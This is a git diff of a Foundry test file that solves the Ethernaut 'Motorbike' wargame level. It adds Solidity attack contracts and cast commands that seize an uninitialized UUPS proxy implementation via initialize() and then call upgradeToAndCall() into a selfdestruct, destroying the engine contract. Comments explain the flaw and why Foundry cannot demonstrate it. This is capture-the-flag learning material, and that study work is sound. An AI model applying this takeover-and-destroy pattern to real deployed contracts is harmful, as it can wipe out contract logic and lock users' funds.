@@ -5,124 +5,138 @@ pragma solidity 0.6.12;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Motorbike.sol";
 
-abstract contract Context {
-    function _msgSender() internal view virtual returns (address) {
-        return msg.sender;
+// 1. engine isn't called initialize() yet, and thus calling initialize() to become upgrader
+// 2. upgradeToAndCall() points to an address with a selfdestruct() function
+//    since delegatecall() is used, upgradeToAndCall() will selfdestruct() engine
+// - note that selfdestruct() takes effect at the end of a tx, thus always verify() with another tx
+
+// first approach: post-cancun eip7702, delegating player to the solution contract
+// 1. cast send 0x0000000000000000000000000000000000000000 --auth <contract_address>
+//    use cast code <MY_ADDRESS> to see if there's bytecode on eoa
+// 2. cast send <MY_ADDRESS> "attack(address,address,address)" <ETHERNAUT> <ENGINE> <MOTORBIKE_FACTORY=level>
+// 3. cast send <MY_ADDRESS> "verify()" <MOTORBIKE_INSTANCE>
+// 4. undelegate: cast send 0x0000000000000000000000000000000000000000 --auth 0x0000000000000000000000000000000000000000
+contract EOASolution {
+    address ethernaut;
+
+    function attack(address _ethernaut, address _engine, address level) public {
+        ethernaut = _ethernaut;
+        (bool result, ) = ethernaut.call(
+            abi.encodeWithSignature("createLevelInstance(address)", level)
+        );
+        require(result, "createLevelInstance failed");
+
+        Engine engine = Engine(_engine);
+        engine.initialize();
+        require(engine.upgrader() == address(this), "initialize() fails");
+        engine.upgradeToAndCall(
+            address(this),
+            abi.encodeWithSelector(EOASolution.kill.selector)
+        );
     }
 
-    function _msgData() internal view virtual returns (bytes calldata) {
-        return msg.data;
+    function verify(address instance) public {
+        (bool result, ) = ethernaut.call(
+            abi.encodeWithSignature(
+                "submitLevelInstance(address)",
+                payable(instance)
+            )
+        );
+
+        require(result, "call failed");
     }
 
-    function _contextSuffixLength() internal view virtual returns (uint256) {
-        return 0;
+    function kill() external {
+        selfdestruct(address(0));
     }
 }
 
-abstract contract Ownable is Context {
-    address private _owner;
+// second approach: contract solution; EOA cannot be registered for completing the level tho
+contract ContractSolution {
+    address motorbikeFactory;
+    address instance;
 
-    function owner() public view virtual returns (address);
+    function attack(address _motorbikeFactory, address _engine) public {
+        motorbikeFactory = _motorbikeFactory;
+        (, bytes memory data) = motorbikeFactory.call(
+            abi.encodeWithSignature("createInstance(address)", address(this))
+        );
 
-    function _checkOwner() internal view virtual;
+        instance = abi.decode(data, (address));
 
-    function renounceOwnership() public virtual;
+        Engine engine = Engine(_engine);
+        engine.initialize();
+        engine.upgradeToAndCall(
+            address(this),
+            abi.encodeWithSelector(ContractSolution.kill.selector)
+        );
+    }
 
-    function transferOwnership(address newOwner) public virtual;
+    function verify() public {
+        (, bytes memory data) = motorbikeFactory.call(
+            abi.encodeWithSignature(
+                "validateInstance(address,address)",
+                payable(instance),
+                address(this)
+            )
+        );
 
-    function _transferOwnership(address newOwner) internal virtual;
+        bool result = abi.decode(data, (bool));
+        require(result, "attack failed");
+    }
+
+    function kill() external {
+        selfdestruct(address(0));
+    }
+}
+contract SelfDesctructor1 {
+    function kill() external {
+        selfdestruct(address(0));
+    }
 }
 
-abstract contract Level is Ownable {
-    function createInstance(address _player) public payable virtual returns (address);
-    function validateInstance(address payable _instance, address _player) public virtual returns (bool);
-}
-
-abstract contract MotorbikeFactory is Level {
-    mapping(address => address) private engines;
-
-    function createInstance(address _player) public payable virtual override returns (address);
-
-    function validateInstance(address payable _instance, address _player) public virtual override returns (bool);
+contract SelfDesctructor2 {
+    constructor() public {
+        selfdestruct(address(0));
+    }
 }
 
 contract MiddleMan {
-    function attack() public payable {
-        selfdestruct(payable(address(0)));
+    function attack() public returns (address) {
+        Engine engine = new Engine();
+        Motorbike motorbike = new Motorbike(address(engine));
+
+        engine.initialize();
+        engine.upgradeToAndCall(
+            address(this),
+            abi.encodeWithSelector(MiddleMan.kill.selector)
+        );
+        return address(engine);
+    }
+
+    function kill() external {
+        selfdestruct(address(0));
     }
 }
 
-contract Execution {
-    address ethernaut;
-
-    constructor(address _ethernaut) public {
-        ethernaut = _ethernaut;
-    }
-
-    function hack(address level, address engine) public {
-        ethernaut.call(abi.encodeWithSignature("createLevelInstance(address)", level));
-
-        engine.call(abi.encodeWithSignature("initialize()"));
-
-        MiddleMan middleMan = new MiddleMan();
-        engine.call(
-            abi.encodeWithSignature(
-                "upgradeToAndCall(address,bytes)", address(middleMan), abi.encodeWithSignature("attack()")
-            )
-        );
-    }
-
-    // note that using this approach, we can verify the result while with MotorbikeFactory
-    // while Ethernaut requires submitter to register as a player,
-    // so unless this contract is registered as a player, this function call will fail
-    function submit(address payable instance) public {
-        ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", instance));
-    }
-}
-
-contract ExecutionTest is Test {
-    function hack(address factoryAddress) public returns (address) {
-        MotorbikeFactory motorbikeFactory = MotorbikeFactory(factoryAddress);
-        address motorbikeAddress = motorbikeFactory.createInstance(msg.sender);
-        console.logAddress(motorbikeAddress);
-
-        address engine = address(
-            uint160(
-                uint256(vm.load(motorbikeAddress, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
-            )
-        );
-        console.logAddress(engine);
-
-        engine.call(abi.encodeWithSignature("initialize()"));
-        // require(
-        //     engine.call(abi.encodeWithSignature("upgrader()")) == address(this),
-        //     "upgrader is not this"
-        // );
-
-        MiddleMan middleMan = new MiddleMan();
-        engine.call(
-            abi.encodeWithSignature(
-                "upgradeToAndCall(address,bytes)", address(middleMan), abi.encodeWithSignature("attack()")
-            )
-        );
-
-        console.logBool(motorbikeFactory.validateInstance(payable(motorbikeAddress), msg.sender));
-
-        return engine;
-    }
-}
-
+// this test shows that foundry seems to treat each line as one separate tx
+// and only allows selfdestruct() to delete code if it's called in constructor()
+// thus, this level cannot be tested and demonstrated with foundry
 contract MotorbikeTest is Test {
-    MotorbikeFactory motorbikeFactory = MotorbikeFactory(vm.envAddress("MOTORBIKE_FACTORY"));
-
     function test() public {
-        ExecutionTest execution = new ExecutionTest();
-        uint64 nonce = vm.getNonce(address(motorbikeFactory));
-        console.logUint(nonce);
-        console.logBytes(abi.encodeWithSelector(MiddleMan.attack.selector));
+        SelfDesctructor1 selfDesctructor1 = new SelfDesctructor1();
+        assertEq(isContract(address(selfDesctructor1)), true);
 
-        address engineAddress = execution.hack(address(motorbikeFactory));
-        console.logBool(isContract(engineAddress));
+        selfDesctructor1.kill();
+        // the next line assertion cannot pass, even with rolling block.number or any other trick
+        // assertEq(isContract(address(selfDesctructor1)), false);
+
+        SelfDesctructor2 selfDesctructor2 = new SelfDesctructor2();
+        assertEq(isContract(address(selfDesctructor2)), false);
+
+        MiddleMan middleMan = new MiddleMan();
+        address engine = middleMan.attack();
+        // assertEq(isContract(engine), false);
     }
 
     function isContract(address _addr) internal view returns (bool) {
